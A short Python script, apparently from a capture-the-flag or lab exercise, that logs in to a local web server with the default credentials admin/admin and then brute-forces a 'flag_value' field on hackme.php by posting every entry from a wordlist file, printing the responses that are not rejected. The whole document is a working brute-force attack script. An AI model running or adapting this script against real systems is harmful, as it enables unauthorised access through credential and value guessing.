import requests
lines = []

with open("wordlistraft.txt","r")as raft:
    lines = raft.readlines()

s = requests.Session()

credentials = {
'username': 'admin',
'password': 'admin'
}

response = s.post('http://192.168.86.159/check.php', data=credentials)
#print (response.text)

#response1 = s.post('http://192.168.86.159/hackme.php', data=credentials)
#print (response1.text)

for i in lines:
    mydata = {'flag_value':i.replace("\n","")}
    response2 = s.post('http://192.168.86.159/hackme.php', data=mydata)
    currentPageText = response2.text
    if "brute-force" not in currentPageText:
        print(response2.text)